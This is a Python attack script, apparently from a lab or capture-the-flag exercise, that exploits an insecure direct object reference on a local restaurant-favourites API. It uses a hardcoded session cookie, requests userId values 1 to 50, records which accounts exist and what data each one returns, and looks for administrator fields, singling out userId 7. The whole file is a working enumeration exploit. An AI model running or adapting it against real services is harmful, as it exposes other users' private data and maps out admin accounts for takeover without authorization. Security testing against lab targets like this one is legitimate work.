import requests
import json

# Configuration
base_url = "http://127.0.0.1:32825"
endpoint = "/api/get_favorite_restaurants.php"
session_cookie = {'PHPSESSID': 'hk4mi61pda6ge5d66s5qjhkil3'}

valid_users = []
admin_account = None
users_without_restaurants = []
users_unknown = []

print("[*] Starting IDOR enumeration of user IDs 1-50")
print(f"[*] Target: {base_url}{endpoint}")
print("[*] Checking for valid users and admin account\n")

# Sample a few IDs to understand the response structure first
print("[*] === SAMPLE RESPONSE ANALYSIS ===")
for user_id in [1, 2, 5, 7, 10, 12, 20, 30, 40, 50]:
    url = f"{base_url}{endpoint}?userId={user_id}"
    
    try:
        response = requests.get(url, cookies=session_cookie, timeout=5)
        
        if response.status_code == 200:
            try:
                data = response.json()
                print(f"\n[Sample] userId {user_id}: {json.dumps(data)}")
            except ValueError:
                print(f"\n[Sample] userId {user_id}: Non-JSON - {response.text[:200]}")
        else:
            print(f"\n[Sample] userId {user_id}: HTTP {response.status_code}")
            
    except Exception as e:
        print(f"\n[Sample] userId {user_id}: Error - {e}")

print("\n[*] === FULL ENUMERATION RESULTS ===")
# Now iterate through all IDs and analyze properly
for user_id in range(1, 51):
    url = f"{base_url}{endpoint}?userId={user_id}"
    
    try:
        response = requests.get(url, cookies=session_cookie, timeout=5)
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                # Check for error messages indicating invalid user
                error_msg = data.get('error', data.get('Error', data.get('message', '')))
                
                if error_msg:  # Has error message
                    if "No favorite restaurants" in error_msg:
                        # This is a valid user with no restaurants
                        users_without_restaurants.append(user_id)
                        print(f"[+] userId {user_id}: VALID USER (no restaurants)")
                    elif "Unknown error" in error_msg:
                        users_unknown.append(user_id)
                        print(f"[-] userId {user_id}: Unknown error")
                    else:
                        # Other type of error
                        print(f"[-] userId {user_id}: Error - {error_msg[:50]}")
                else:
                    # No error message - means valid data found
                    valid_users.append(user_id)
                    restaurant_count = len(data.get('restaurants', []))
                    username = data.get('username', data.get('user', 'Unknown'))
                    
                    print(f"[+] userId {user_id}: VALID USER - {restaurant_count} restaurants")
                    print(f"    Username: {username}")
                    
                    # Check for admin indicators
                    admin_found = False
                    admin_info = []
                    
                    data_str = str(data).lower()
                    if 'admin' in data_str or 'administrator' in data_str:
                        admin_found = True
                        
                        # Find specific admin fields
                        for key, value in data.items():
                            if 'admin' in str(key).lower() or 'admin' in str(value).lower():
                                admin_info.append(f"{key}: {value}")
                    
                    if admin_found:
                        print(f"    [!] ADMIN INDICATORS FOUND: {admin_info}")
                    
                    # Special handling for userId=7
                    if user_id == 7:
                        print(f"\n[!] === USERID=7 DETAILS ===")
                        print(f"Username: {username}")
                        print(f"Restaurant count: {restaurant_count}")
                        print(f"Full response: {json.dumps(data, indent=2)}")
                        
                        full_data_str = json.dumps(data)
                        admin_indicators = [key for key in data.keys() if 'admin' in key.lower()]
                        
                        account_info = {
                            'userId': 7,
                            'username': username,
                            'restaurants': restaurant_count,
                            'has_admin_indicators': bool(admin_indicators),
                            'admin_fields': admin_indicators,
                            'full_data': data
                        }
                        
                        admin_account = account_info
            except ValueError:
                print(f"[-] userId {user_id}: Non-JSON response - {response.text[:100]}")
        else:
            print(f"[-] userId {user_id}: HTTP {response.status_code}")
            
    except requests.exceptions.Timeout:
        print(f"[!] userId {user_id}: Request timed out")
    except requests.exceptions.RequestException as e:
        print(f"[!] userId {user_id}: Request failed - {e}")

# Print summary
print("\n" + "="*70)
print("IDOR ENUMERATION SUMMARY")
print("="*70)
print(f"\nValid users with restaurants: {len(valid_users)}")
if valid_users:
    print(f"IDs: {valid_users}")

print(f"\nValid users without restaurants: {len(users_without_restaurants)}")
if users_without_restaurants:
    print(f"IDs: {users_without_restaurants}")

print(f"\nUsers with unknown errors: {len(users_unknown)}")
if users_unknown:
    print(f"IDs: {users_unknown}")

all_valid_users = valid_users + users_without_restaurants
print(f"\nTOTAL VALID USERS: {len(all_valid_users)}")
if all_valid_users:
    print(f"All valid user IDs: {sorted(all_valid_users)}")

if admin_account:
    print(f"\n[!] USERID=7 ANALYSIS:")
    print(json.dumps(admin_account, indent=2))
    
    if admin_account['has_admin_indicators']:
        print(f"\n[+] CONFIRMED: userId=7 is an ADMIN account!")
        print(f"Admin fields: {admin_account['admin_fields']}")
    else:
        print(f"\n[?] userId=7 found but no explicit admin indicators")
        print(f"Username: {admin_account['username']}")
        print(f"Restaurants: {admin_account['restaurants']}")
else:
    print(f"\n[-] userId=7 was not found or returned error")

